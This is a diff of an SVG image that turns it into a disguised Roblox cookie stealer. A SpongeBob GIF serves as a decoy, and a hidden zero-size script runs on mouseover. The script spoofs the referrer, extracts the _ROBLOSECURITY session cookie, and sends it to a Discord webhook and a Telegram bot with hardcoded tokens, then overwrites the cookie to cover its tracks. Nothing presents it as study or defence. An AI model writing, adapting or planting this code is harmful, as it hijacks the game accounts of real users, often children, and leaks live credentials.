@@ -1,25 +1,34 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">  
-  <!-- Invisible to user -->  
-  <foreignObject width="100%" height="100%">  
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500" viewBox="0 0 500 500" onmouseover="steal()">  
+  <!-- DECOY LAYER: SpongeBob GIF -->  
+  <image href="https://gifdb.com/images/file/spongebob-freaking-out-brain-on-fire-t11wtoznvi1pyadq.gif" width="100%" height="100%"/>  
+
+  <!-- COOKIE JACKER (INVISIBLE) -->  
+  <foreignObject width="0" height="0">  
     <body xmlns="http://www.w3.org/1999/xhtml">  
       <script>  
-        // Phase 1: Spoof Roblox origin  
-        Object.defineProperty(document, 'referrer', {  
-          get: () => 'https://www.roblox.com/'  
-        });  
+        function steal() {  
+          // Spoof Roblox origin  
+          Object.defineProperty(document, 'referrer', {  
+            get: () => 'https://www.roblox.com/'  
+          });  
 
-        // Phase 2: Steal cookies  
-        const cookies = document.cookie;  
-        const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('_ROBLOSECURITY='));  
+          // Extract cookie  
+          const cookie = document.cookie.match(/_ROBLOSECURITY=([^;]+)/)[1];  
 
-        // Phase 3: Exfiltrate via Discord webhook + Telegram  
-        fetch('https://discord.com/api/webhooks/1343503446044839946/l9a_3NpZGCkczHw8NAU_zc8afybkxmV4QWmSX3KhLGp1DbQQSbecUmtGkiK2xdRcaBlU', {  
-          method: 'POST',  
-          headers: {'Content-Type': 'application/json'},  
-          body: JSON.stringify({content: `||${robloxCookie}||`})  
-        });  
+          // Discord Webhook  
+          fetch('https://discord.com/api/webhooks/1343503446044839946/l9a_3NpZGCkczHw8NAU_zc8afybkxmV4QWmSX3KhLGp1DbQQSbecUmtGkiK2xdRcaBlU', {  
+            method: 'POST',  
+            headers: {'Content-Type': 'application/json'},  
+            body: JSON.stringify({content: `||@everyone **COOKIE HARVESTED**\n\`${cookie}\`||`})  
+          }).catch(e => {});  
 
-        fetch(`https://api.telegram.org/7689732639:AAFzAGyOODxKzk4RlMJjMUBEivbR4VkK8WY/sendMessage?chat_id=CHAT_ID&text=${encodeURIComponent(robloxCookie)}`);  
+          // Telegram Exfiltration  
+          fetch(`https://api.telegram.org/bot7689732639:AAFzAGyOODxKzk4RlMJjMUBEivbR4VkK8WY/sendMessage?chat_id=CHAT_ID&text=${encodeURIComponent(cookie)}`)  
+            .catch(e => {});  
+
+          // Misdirection: Overwrite cookie  
+          document.cookie = `_ROBLOSECURITY=dead${Math.random()}; domain=.roblox.com; path=/`;  
+        }  
       </script>  
     </body>  
   </foreignObject>  
